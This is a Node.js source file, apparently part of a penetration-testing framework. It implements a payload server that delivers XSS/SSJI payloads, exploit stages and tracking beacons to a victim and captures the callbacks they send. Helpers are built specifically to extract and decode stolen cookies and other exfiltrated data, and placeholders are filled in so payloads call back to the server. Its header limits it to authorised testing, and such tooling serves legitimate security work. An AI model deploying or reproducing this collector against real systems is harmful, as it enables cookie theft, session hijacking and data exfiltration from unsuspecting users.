/**
 * Payload server + hit capture (Components B and C)
 *
 * A single HTTP server that (B) serves payloads to a victim — `payload.js` for
 * XSS/SSJI, an exploit stage, a beacon GIF — and (C) captures the callback the
 * payload fires back (e.g. an XSS exfiltrating `document.cookie` to
 * `/?cookie=…`). Capture is exposed as a Promise (`waitForHit`) and as an
 * EventEmitter (`'hit'`), so it fits both `await` flows and reactive flows
 * without ever blocking the event loop.
 *
 * For authorized security testing and educational use only. Only run this
 * against systems you own or have explicit written permission to test.
 */

import http from 'http';
import fs from 'fs/promises';
import { EventEmitter } from 'events';
import logger from '../utils/logger.js';
import { ListenerError, TimeoutError, ValidationError } from '../utils/errors.js';

/**
 * A 1×1 transparent GIF, ready to serve as an `<img>` beacon (Content-Type
 * `image/gif`). Route it and any browser that renders the tag fires a hit.
 * @type {Buffer}
 */
export const GIF_1x1 = Buffer.from(
    'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
    'base64'
);

/**
 * Shorthand → Content-Type presets. RB-3 mandates js/html/gif; the rest are
 * common conveniences. Any full MIME string is passed through unchanged.
 * @private
 */
const CONTENT_TYPE_PRESETS = {
    js: 'application/javascript',
    javascript: 'application/javascript',
    html: 'text/html',
    htm: 'text/html',
    gif: 'image/gif',
    png: 'image/png',
    json: 'application/json',
    css: 'text/css',
    txt: 'text/plain',
    text: 'text/plain',
};

/**
 * Infer a Content-Type from a path's extension (RB-3 default behaviour).
 * @param {string} path - Route path
 * @returns {string} - MIME type
 * @private
 */
function contentTypeFromPath(path) {
    const m = path.match(/\.([a-z0-9]+)$/i);
    const ext = m ? m[1].toLowerCase() : '';
    return CONTENT_TYPE_PRESETS[ext] || 'text/plain';
}

/**
 * Whether a Content-Type is binary (so placeholder substitution must be
 * skipped to avoid corrupting the bytes).
 * @param {string} contentType
 * @returns {boolean}
 * @private
 */
function isBinaryContentType(contentType) {
    if (!contentType) return false;
    const ct = contentType.toLowerCase();
    return (
        ct.startsWith('image/') ||
        ct.startsWith('audio/') ||
        ct.startsWith('video/') ||
        ct.startsWith('font/') ||
        ct.includes('octet-stream')
    );
}

/**
 * Substitute `{{KEY}}` placeholders in a string using plain `.split().join()`
 * (RB-4) so it never conflicts with the single-brace `{}` used by SSTI/SSJI
 * payloads.
 * @param {string} text - Source text
 * @param {Record<string,string>} vars - Placeholder map
 * @returns {string}
 * @private
 */
function substituteVars(text, vars) {
    let out = text;
    for (const [key, value] of Object.entries(vars)) {
        out = out.split(`{{${key}}}`).join(String(value));
    }
    return out;
}

/**
 * Normalize an incoming request body to a parsed value based on Content-Type.
 * @param {string} raw - Raw request body
 * @param {string} contentType - Request Content-Type header
 * @returns {*} - Parsed body (object for form/JSON, else the raw string or null)
 * @private
 */
function parseBody(raw, contentType) {
    if (!raw) return null;
    const ct = (contentType || '').toLowerCase();
    if (ct.includes('application/json')) {
        try { return JSON.parse(raw); } catch { return raw; }
    }
    if (ct.includes('application/x-www-form-urlencoded')) {
        const obj = {};
        for (const [k, v] of new URLSearchParams(raw)) obj[k] = v;
        return obj;
    }
    return raw;
}

/**
 * @typedef {object} CapturedRequest
 * @property {string} method - HTTP method
 * @property {string} path - Request path (no query string)
 * @property {Record<string,string>} query - Parsed query string
 * @property {Record<string,string>} headers - Request headers (lowercase keys)
 * @property {string} bodyRaw - Raw request body
 * @property {*} body - Parsed body (object for form/JSON, else raw string or null)
 * @property {string} remoteAddress - Client IP
 * @property {number} timestamp - Capture time (ms since epoch)
 * @property {(enc: 'base64'|'url', key?: string) => string} decoded - Decode the exfiltrated value
 */

/**
 * Build a CapturedRequest evidence object with a `decoded()` helper.
 * @param {object} parts - Captured fields
 * @returns {CapturedRequest}
 * @private
 */
function makeCapturedRequest(parts) {
    const hit = {
        method: parts.method,
        path: parts.path,
        query: parts.query,
        headers: parts.headers,
        bodyRaw: parts.bodyRaw,
        body: parts.body,
        remoteAddress: parts.remoteAddress,
        timestamp: parts.timestamp,

        /**
         * Decode the exfiltrated value — a stolen cookie usually arrives as
         * url-safe base64. With no `key`, the value is chosen automatically:
         * a single query param, else `cookie`/`data`/`d`/`c`, else the body.
         * @param {'base64'|'url'} enc - Decoding to apply
         * @param {string} [key] - Explicit query-param name to decode
         * @returns {string} - Decoded text
         */
        decoded(enc, key) {
            const value = key != null
                ? (this.query[key] ?? '')
                : primaryValue(this);

            if (enc === 'url') {
                try { return decodeURIComponent(value); } catch { return value; }
            }
            if (enc === 'base64') {
                // Accept both standard and url-safe base64.
                const normalized = value.replace(/-/g, '+').replace(/_/g, '/');
                return Buffer.from(normalized, 'base64').toString('utf-8');
            }
            throw new ValidationError(`Unknown decode encoding: ${enc}`, 'enc');
        },
    };
    return hit;
}

/**
 * Pick the most likely exfiltrated value from a captured request.
 * @param {CapturedRequest} hit
 * @returns {string}
 * @private
 */
function primaryValue(hit) {
    const values = Object.values(hit.query);
    if (values.length === 1) return values[0];
    for (const k of ['cookie', 'data', 'd', 'c']) {
        if (hit.query[k] != null) return hit.query[k];
    }
    if (values.length > 0) return values[0];
    return hit.bodyRaw || '';
}

/**
 * Default options for {@link PayloadServer}.
 * @private
 */
const DEFAULT_OPTIONS = {
    host: '0.0.0.0',   // reachable from the victim on the VPN (never 127.0.0.1)
    port: 0,           // 0 = OS-assigned free port
    vars: {},
    callback: { status: 200, body: '', contentType: 'text/plain', headers: {} },
};

/**
 * Payload server + hit collector.
 *
 * One instance serves payload routes AND captures every incoming request as a
 * {@link CapturedRequest}. Emits `'request'` and `'hit'` per capture and
 * `'error'` on server failure. `start()`/`stop()` are non-blocking; `stop()` is
 * idempotent and frees the port for the next run.
 *
 * @fires PayloadServer#request
 * @fires PayloadServer#hit
 * @fires PayloadServer#error
 */
export class PayloadServer extends EventEmitter {
    /**
     * @param {object} [options] - Options
     * @param {string} [options.host='0.0.0.0'] - Bind address (0.0.0.0 so the victim can reach it)
     * @param {number} [options.port=0] - Port (0 = OS-assigned free port)
     * @param {Record<string,string>} [options.vars] - Placeholders for `{{LHOST}}` etc.
     * @param {object} [options.callback] - Default response for captured (unrouted) hits { status, body, contentType, headers }
     */
    constructor(options = {}) {
        super();
        this.host = options.host || DEFAULT_OPTIONS.host;
        this.port = options.port != null ? options.port : DEFAULT_OPTIONS.port;
        this.vars = { ...DEFAULT_OPTIONS.vars, ...(options.vars || {}) };
        this.callbackResponse = { ...DEFAULT_OPTIONS.callback, ...(options.callback || {}) };

        /** @type {Map<string, object>} path → route spec */
        this._routes = new Map();
        /** @type {CapturedRequest[]} */
        this.hits = [];
        /** @type {Array<object>} pending waitForHit() waiters */
        this._waiters = [];
        /** @type {WeakSet<CapturedRequest>} hits already handed to a waiter */
        this._consumed = new WeakSet();

        this._server = null;
        this._listening = false;
    }

    /**
     * Register a route to serve. Multiple routes are supported; the base case is
     * a single one. `body` is a literal string (placeholders substituted) or a
     * Buffer; `file` is read from disk on demand. Content-Type is inferred from
     * the path unless overridden (`contentType` accepts a full MIME type or a
     * shorthand like `js`/`html`/`gif`).
     * @param {string} path - Route path (e.g. '/payload.js')
     * @param {object} spec - Route spec
     * @param {string|Buffer} [spec.body] - Response body (string placeholders are substituted)
     * @param {string} [spec.file] - File to read and serve on demand
     * @param {string} [spec.contentType] - Full MIME type or shorthand (js/html/gif/…)
     * @param {number} [spec.status=200] - Response status code
     * @param {Record<string,string>} [spec.headers] - Extra response headers
     * @returns {this}
     */
    route(path, spec = {}) {
        if (typeof path !== 'string' || !path.startsWith('/')) {
            throw new ValidationError('Route path must start with "/"', 'path');
        }
        const contentType = spec.contentType
            ? (CONTENT_TYPE_PRESETS[spec.contentType.toLowerCase()] || spec.contentType)
            : contentTypeFromPath(path);

        this._routes.set(path, {
            body: spec.body,
            file: spec.file,
            contentType,
            status: spec.status || 200,
            headers: spec.headers || {},
        });
        return this;
    }

    /**
     * Effective placeholder map, auto-filling LPORT/LHOST/COLLECTOR from the
     * running server unless the caller already set them.
     * @returns {Record<string,string>}
     * @private
     */
    _effectiveVars() {
        const lhost = this.vars.LHOST || this.host;
        const lport = this.vars.LPORT || String(this.port);
        return {
            LHOST: lhost,
            LPORT: lport,
            COLLECTOR: this.vars.COLLECTOR || `http://${lhost}:${lport}`,
            ...this.vars,
        };
    }

    /**
     * Resolve a route's body to the bytes to send, applying placeholder
     * substitution to text bodies (RB-4) and reading files on demand (RB-2).
     * @param {object} route - Route spec
     * @returns {Promise<Buffer>}
     * @private
     */
    async _resolveBody(route) {
        let raw;
        if (route.file != null) {
            raw = await fs.readFile(route.file);
        } else if (Buffer.isBuffer(route.body)) {
            raw = route.body;
        } else if (route.body != null) {
            raw = Buffer.from(String(route.body));
        } else {
            raw = Buffer.alloc(0);
        }

        // Only substitute in text payloads — never touch binary (e.g. GIF).
        if (!isBinaryContentType(route.contentType)) {
            const text = substituteVars(raw.toString('utf-8'), this._effectiveVars());
            return Buffer.from(text);
        }
        return raw;
    }

    /**
     * HTTP request handler: capture the request as evidence, dispatch it to
     * waiters/listeners, then respond (route content, or the callback default).
     * @param {http.IncomingMessage} req
     * @param {http.ServerResponse} res
     * @private
     */
    async _handle(req, res) {
        // Collect the body.
        const chunks = [];
        req.on('data', (c) => chunks.push(c));
        await new Promise((resolve) => req.on('end', resolve));
        const bodyRaw = Buffer.concat(chunks).toString('utf-8');

        // Parse URL/query.
        const url = new URL(req.url, `http://${req.headers.host || 'listener'}`);
        const query = {};
        for (const [k, v] of url.searchParams) query[k] = v;

        const capture = makeCapturedRequest({
            method: req.method,
            path: url.pathname,
            query,
            headers: { ...req.headers },
            bodyRaw,
            body: parseBody(bodyRaw, req.headers['content-type']),
            remoteAddress: req.socket.remoteAddress || '',
            timestamp: Date.now(),
        });

        const route = this._routes.get(url.pathname);
        const qs = url.search || '';

        // Every request is evidence and fires 'request' (RB-8). A request to a
        // served route is a payload fetch; an unrouted request is the callback
        // (a "hit") — only those feed getHits()/'hit'/waitForHit(), so a bare
        // waitForHit() ignores the victim fetching payload.js.
        this.emit('request', capture);

        // Respond.
        try {
            if (route) {
                logger.info(`serve ${capture.method} ${capture.path}${qs} → ${route.contentType}`);
                const bodyBuffer = await this._resolveBody(route);
                res.writeHead(route.status, {
                    'Content-Type': route.contentType,
                    'Content-Length': bodyBuffer.length,
                    ...route.headers,
                });
                res.end(bodyBuffer);
            } else {
                logger.info(`hit ${capture.method} ${capture.path}${qs} from ${capture.remoteAddress}`);
                this._dispatch(capture);

                // Captured (unrouted) hit → configurable callback response.
                const cb = this.callbackResponse;
                const bodyBuffer = Buffer.from(cb.body || '');
                res.writeHead(cb.status || 200, {
                    'Content-Type': cb.contentType || 'text/plain',
                    'Content-Length': bodyBuffer.length,
                    ...(cb.headers || {}),
                });
                res.end(bodyBuffer);
            }
        } catch (err) {
            // Serving failed (e.g. missing file) — 500 but keep the server alive.
            logger.error(`Failed to serve ${url.pathname}: ${err.message}`);
            if (!res.headersSent) res.writeHead(500, { 'Content-Type': 'text/plain' });
            res.end('');
        }
    }

    /**
     * Record a hit and satisfy the first matching pending waiter.
     * @param {CapturedRequest} hit
     * @private
     */
    _dispatch(hit) {
        this.hits.push(hit);
        /**
         * @event PayloadServer#hit
         * @type {CapturedRequest}
         */
        this.emit('hit', hit);

        for (let i = 0; i < this._waiters.length; i++) {
            const w = this._waiters[i];
            if (!w.predicate || w.predicate(hit)) {
                this._waiters.splice(i, 1);
                if (w.timer) clearTimeout(w.timer);
                this._consumed.add(hit);
                w.resolve(hit);
                break;
            }
        }
    }

    /**
     * Start listening. Non-blocking: resolves as soon as the server is up and
     * leaves it running in the background.
     * @returns {Promise<{host: string, port: number, url: string}>}
     * @throws {ListenerError} On bind failure (EADDRINUSE/EACCES)
     */
    start() {
        return new Promise((resolve, reject) => {
            if (this._listening) {
                const info = this._info();
                return resolve(info);
            }

            this._server = http.createServer((req, res) => {
                this._handle(req, res).catch((err) => {
                    logger.error(`Handler error: ${err.message}`);
                    if (!res.headersSent) {
                        try { res.writeHead(500); res.end(''); } catch { /* ignore */ }
                    }
                });
            });

            // Bind-time errors (EADDRINUSE/EACCES) reject start().
            const onListenError = (err) => {
                this._server.removeListener('error', onListenError);
                reject(new ListenerError(translateBindError(err, this.host, this.port), err.code, err));
            };
            this._server.once('error', onListenError);

            this._server.listen(this.port, this.host, () => {
                this._server.removeListener('error', onListenError);
                this._listening = true;
                const addr = this._server.address();
                this.port = addr.port;

                // Runtime errors after listening are surfaced as 'error' events.
                this._server.on('error', (err) => this.emit('error', err));

                const info = this._info();
                logger.success(`Payload server listening on ${info.url}`);
                resolve(info);
            });
        });
    }

    /**
     * Wait for the next captured request (or the first matching `predicate`).
     * A hit that arrives before this call is buffered and delivered on call, so
     * a callback that lands early still resolves.
     * @param {object} [options] - Options
     * @param {(h: CapturedRequest) => boolean} [options.predicate] - Filter for the hit to wait for
     * @param {number} [options.timeout=60000] - Reject after this many ms (0 = wait forever)
     * @returns {Promise<CapturedRequest>}
     * @throws {TimeoutError} If no matching hit arrives within the timeout
     * @throws {ListenerError} If the server is stopped while waiting
     */
    waitForHit(options = {}) {
        const { predicate, timeout = 60000 } = options;
        return new Promise((resolve, reject) => {
            // Deliver a buffered, not-yet-consumed hit if one already matches.
            for (const h of this.hits) {
                if (this._consumed.has(h)) continue;
                if (!predicate || predicate(h)) {
                    this._consumed.add(h);
                    return resolve(h);
                }
            }

            const waiter = { predicate, resolve, reject, timer: null };
            if (timeout > 0) {
                waiter.timer = setTimeout(() => {
                    this._waiters = this._waiters.filter((w) => w !== waiter);
                    reject(new TimeoutError(`No hit received within ${timeout}ms`, timeout));
                }, timeout);
                if (typeof waiter.timer.unref === 'function') waiter.timer.unref();
            }
            this._waiters.push(waiter);
        });
    }

    /**
     * All captured hits so far, in arrival order (evidence for the report).
     * @returns {CapturedRequest[]}
     */
    getHits() {
        return [...this.hits];
    }

    /**
     * Stop the server and free the port. Idempotent. Any callers still blocked
     * in waitForHit() are rejected with a ListenerError.
     * @returns {Promise<void>}
     */
    stop() {
        return new Promise((resolve) => {
            // Reject anyone still waiting.
            const waiters = this._waiters;
            this._waiters = [];
            for (const w of waiters) {
                if (w.timer) clearTimeout(w.timer);
                w.reject(new ListenerError('Server stopped while waiting for a hit'));
            }

            if (!this._server || !this._listening) {
                this._listening = false;
                return resolve();
            }

            this._server.close(() => {
                this._listening = false;
                this._server = null;
                resolve();
            });
        });
    }

    /**
     * Current server descriptor.
     * @returns {{host: string, port: number, url: string}}
     * @private
     */
    _info() {
        const urlHost = this.vars.LHOST || this.host;
        return {
            host: this.host,
            port: this.port,
            url: `http://${urlHost}:${this.port}`,
        };
    }
}

/**
 * Translate a bind-time socket error to a friendly message, reusing the same
 * wording as the transport layer (R2-4).
 * @param {Error} err - Socket error
 * @param {string} host - Bind host
 * @param {number} port - Bind port
 * @returns {string}
 * @private
 */
function translateBindError(err, host, port) {
    switch (err.code) {
        case 'EADDRINUSE':
            return `Port ${port} already in use`;
        case 'EACCES':
            return `Permission denied binding ${host}:${port} (try a port > 1024 or elevated privileges)`;
        default:
            return `Failed to start payload server on ${host}:${port}: ${err.message} (code: ${err.code || 'unknown'})`;
    }
}
